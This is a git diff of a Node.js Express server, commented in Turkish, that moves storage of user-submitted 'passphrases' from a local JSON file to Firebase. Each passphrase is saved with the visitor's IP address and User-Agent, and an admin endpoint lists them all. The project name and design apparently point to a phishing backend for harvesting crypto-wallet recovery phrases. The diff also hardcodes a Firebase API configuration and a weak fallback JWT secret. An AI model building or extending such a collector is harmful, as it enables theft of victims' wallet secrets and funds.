@@ -2,38 +2,28 @@ const express = require('express');
 const path = require('path');
 const jwt = require('jsonwebtoken');
 const dotenv = require('dotenv');
-const fs = require('fs').promises;
-const db = require('./database');
+const { initializeApp } = require('firebase/app');
+const { getDatabase, ref, push, get, query, orderByChild } = require('firebase/database');
 
 dotenv.config();
 
-// JWT Secret key kontrolü ve tanımlaması
+const firebaseConfig = {
+  apiKey: "AIzaSyDpyWxrM6jxOxEUEbb6VkV5eMaviv6fBaQ",
+  authDomain: "piwa-ec527.firebaseapp.com",
+  databaseURL: "https://piwa-ec527-default-rtdb.firebaseio.com",
+  projectId: "piwa-ec527",
+  storageBucket: "piwa-ec527.firebasestorage.app",
+  messagingSenderId: "987555046428",
+  appId: "1:987555046428:web:486e6476728d0ae12f6bd9",
+  measurementId: "G-F4WG6VHXXW"
+};
+
+// Firebase başlatma
+const firebaseApp = initializeApp(firebaseConfig);
+const database = getDatabase(firebaseApp);
+
+// JWT Secret key
 const JWT_SECRET = process.env.JWT_SECRET || 'your_super_secret_key_123456789';
-const DATA_FILE = path.join(__dirname, 'data.json');
-
-// Veri kaydetme fonksiyonu
-const saveData = async (data) => {
-  try {
-    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
-  } catch (error) {
-    console.error('Veri kaydetme hatası:', error);
-  }
-};
-
-// Veri okuma fonksiyonu
-const readData = async () => {
-  try {
-    const data = await fs.readFile(DATA_FILE, 'utf8');
-    return JSON.parse(data);
-  } catch (error) {
-    // Dosya yoksa boş array döndür
-    if (error.code === 'ENOENT') {
-      return { passphrases: [] };
-    }
-    console.error('Veri okuma hatası:', error);
-    return { passphrases: [] };
-  }
-};
 
 const app = express();
 
@@ -126,9 +116,7 @@ app.post('/api/save-passphrase', async (req, res) => {
   }
 
   try {
-    const data = await readData();
     const newPassphrase = {
-      id: Date.now(),
       passphrase,
       ip: req.ip,
       userAgent: req.get('User-Agent'),
@@ -136,10 +124,11 @@ app.post('/api/save-passphrase', async (req, res) => {
       createdAt: new Date().toISOString()
     };
 
-    data.passphrases.push(newPassphrase);
-    await saveData(data);
+    // Firebase'e kaydet
+    const passphraseRef = ref(database, 'passphrases');
+    await push(passphraseRef, newPassphrase);
 
-    console.log('Passphrase kaydedildi:', newPassphrase.id);
+    console.log('Passphrase kaydedildi');
     res.json({ success: true });
   } catch (error) {
     console.error('Kaydetme hatası:', error);
@@ -150,11 +139,23 @@ app.post('/api/save-passphrase', async (req, res) => {
 // Admin endpoint'i (korumalı)
 app.get('/api/admin/passphrases', authenticateToken, async (req, res) => {
   try {
-    const data = await readData();
-    res.json({ 
-      success: true, 
-      data: data.passphrases.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+    const passphraseRef = ref(database, 'passphrases');
+    const passphraseQuery = query(passphraseRef, orderByChild('createdAt'));
+    
+    const snapshot = await get(passphraseQuery);
+    const passphrases = [];
+    
+    snapshot.forEach((childSnapshot) => {
+      passphrases.push({
+        id: childSnapshot.key,
+        ...childSnapshot.val()
+      });
     });
+
+    // Tarihe göre tersine sırala
+    passphrases.reverse();
+
+    res.json({ success: true, data: passphrases });
   } catch (error) {
     console.error('Veri alma hatası:', error);
     res.status(500).json({ success: false, error: 'Veriler alınamadı' });
